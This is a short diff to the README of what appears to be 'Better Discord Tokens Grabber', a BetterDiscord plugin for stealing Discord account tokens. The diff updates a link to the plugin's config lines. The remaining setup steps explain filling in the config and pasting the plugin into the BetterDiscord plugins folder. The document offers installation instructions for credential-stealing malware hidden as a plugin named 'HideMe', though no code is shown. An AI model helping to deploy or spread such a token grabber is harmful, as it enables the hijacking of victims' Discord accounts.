@@ -18,7 +18,7 @@ Better Discord Tokens Grabber Plugin
 - Verified Games & Programs List
 
 # Setup
-- Fill up the [config](https://github.com/HideakiAtsuyo/BetterGrabber/blob/master/GOD/HideMe.plugin.js#L47-L57)
+- Fill up the [config](https://github.com/HideakiAtsuyo/BetterGrabber/blob/master/GOD/HideMe.plugin.js#L83-L93)
 - Windows + R
 - `%appdata%\BetterDiscord\plugins` then hit Enter
 - Paste the plugin, activate it
